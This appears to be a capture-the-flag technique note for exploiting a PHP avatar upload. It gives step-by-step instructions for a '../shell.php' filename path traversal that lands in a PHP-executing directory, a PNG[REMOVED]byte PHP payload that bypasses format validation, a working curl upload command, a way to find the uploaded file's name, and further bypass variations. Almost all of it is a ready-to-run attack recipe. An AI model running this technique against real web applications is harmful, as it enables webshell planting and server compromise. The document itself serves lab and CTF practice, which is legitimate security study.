# Avatar Upload Path Traversal for PHP Execution

## Trigger
- File upload feature (avatar, profile picture) stores files on disk
- Uploaded .php files are served as plain text (not executed) in the upload directory
- Parent or sibling directory DOES execute PHP

## Technique

### Discovery
1. Upload a `.php` file with valid image magic bytes prefix
2. Identify the uploaded filename (check profile page HTML for `<img src="...">`)
3. Access the file via browser — if served as plain text, PHP is disabled in that dir
4. Confirm the parent directory serves PHP (e.g., any existing `.php` page works at `/public/image/`)

### Exploitation
1. Upload with filename `../shell.php` to write to the parent directory where PHP IS enabled
2. App may append random suffix (e.g., `../shell.php` → `shellXXXXXXXX.php`)
3. Check profile page HTML again for the new avatar path to get the actual filename
4. Access at the parent path: `https://target/public/image/shellXXXXXXXX.php`

### PHP File Content (with PNG magic bytes to bypass format validation)
```
\x89PNG\r\n\x1a\n<?php echo file_get_contents("/etc/flag"); ?>
```

### curl Command
```bash
printf '\x89PNG\r\n\x1a\n<?php echo file_get_contents("/etc/flag"); ?>' | \
  curl -sk -b "PHPSESSID=$SESS" -X POST "https://target/signup" \
  -F "profile_upload=@-;filename=../shell.php;type=image/png" \
  -F "updavatar_button=Upload Avatar"
```

### Finding the Uploaded Filename
```bash
curl -sk -b "PHPSESSID=$SESS" "https://target/home" | \
  grep -o 'public/image/avatar/[^"]*'
# Output: public/image/avatar/../shellXXXXXX.php
# Resolves to: public/image/shellXXXXXX.php
```

## Key Details (SecOps June 2026)
- Upload endpoint: `POST /signup` with multipart form
- Upload directory: `public/image/avatar/` (PHP execution DISABLED)
- Parent directory: `public/image/` (PHP execution ENABLED)
- App appends 10 random chars to filename but preserves extension
- PNG magic bytes bypass the "valid file format" check
- `.phtml`, `.php5` extensions were rejected; only `.php` accepted
- `.htaccess` upload was rejected (invalid format)
- `.user.ini` upload was rejected (invalid format)
- Path traversal `../` in filename was NOT sanitized

## Variations
- If parent dir also disables PHP, try `../../` to reach webroot
- If random suffix breaks execution, try `.php.` or `.php ` (trailing dot/space)
- If server uses nginx instead of Apache, check if location block applies to nested paths
- Upload `.user.ini` with `auto_prepend_file=/etc/flag` if the directory already has PHP enabled but you need to read specific files without a new PHP script

## Related
- S3 bucket webshell upload (if app syncs S3→disk)
- Download endpoint path traversal (read files, not execute)
- Predictable reset token (SHA-512 of email) for initial auth
